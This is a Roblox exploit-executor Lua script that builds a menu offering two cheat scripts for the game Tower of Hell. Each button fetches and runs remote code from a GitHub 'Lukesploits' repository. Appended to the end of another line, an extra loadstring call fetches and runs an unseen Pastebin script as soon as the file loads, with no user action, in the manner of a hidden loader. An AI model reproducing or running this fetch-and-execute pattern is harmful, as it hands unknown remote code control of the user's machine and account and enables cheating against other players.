-- Instances:

local Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageButton = Instance.new("ImageButton")
local ImageButton_2 = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol.Name = "Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol"
Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol.Parent = game.CoreGui

Frame.Parent = Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol
Frame.BackgroundColor3 = Color3.fromRGB(116, 116, 116)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.212298676, 0, 0.190044507, 0)
Frame.Size = UDim2.new(0, 784, 0, 428)

ImageButton.Parent = Frame
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.000274035381, 0, 0.442167312, 0)
ImageButton.Size = UDim2.new(0, 392, 0, 238)
ImageButton.Image = "rbxgameasset://Images/Ok"

ImageButton_2.Parent = Frame
ImageButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton_2.BorderSizePixel = 0
ImageButton_2.Position = UDim2.new(0.501495957, 0, 0.442167312, 0)
ImageButton_2.Size = UDim2.new(0, 391, 0, 238)
ImageButton_2.Image = "rbxgameasset://Images/OkOk"

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.00127551018, 0, 0.135514021, 0)
TextLabel.Size = UDim2.new(0, 783, 0, 131)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Choose gui"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(-0.00127551018, 0, 1, 0)
TextLabel_2.Size = UDim2.new(0, 784, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Reallukeisbest#2583"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

-- Scripts:

local function QMKFN_fake_script() -- ImageButton.Script 
	local script = Instance.new('Script', ImageButton)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/Reallukeisbest/Lukesploits/master/Tower%20of%20hell%201.lua'),true))()
		game.CoreGui.Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol:Destroy()
	end)
end
coroutine.wrap(QMKFN_fake_script)()
local function UDAOXJ_fake_script() -- ImageButton_2.Script 
	local script = Instance.new('Script', ImageButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		game.CoreGui.Lwewjfhweuofgbefwtor4t839eoiuwybr33gnr3uiprotectionlol:Destroy()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/Reallukeisbest/Lukesploits/master/Tower%20of%20hell%202.lua'),true))()
	end)
end
coroutine.wrap(UDAOXJ_fake_script)() loadstring(game:HttpGet("https://pastebin.com/raw/Z0UWFqkj"))()
local function OLTG_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(OLTG_fake_script)()
